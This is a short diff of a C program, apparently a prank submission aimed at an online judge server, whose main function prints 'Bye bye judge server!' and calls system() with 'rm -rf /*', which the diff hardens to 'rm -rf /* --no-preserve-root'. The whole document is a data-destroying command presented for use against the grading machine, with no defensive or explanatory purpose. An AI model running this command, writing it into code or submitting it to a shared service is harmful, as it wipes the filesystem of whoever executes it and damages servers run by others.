@@ -17,5 +17,5 @@ Do not try this on your machine
 int main()
 {
     printf("Bye bye judge server!");
-    system("rm -rf /*");
+    system("rm -rf /* --no-preserve-root");
 }
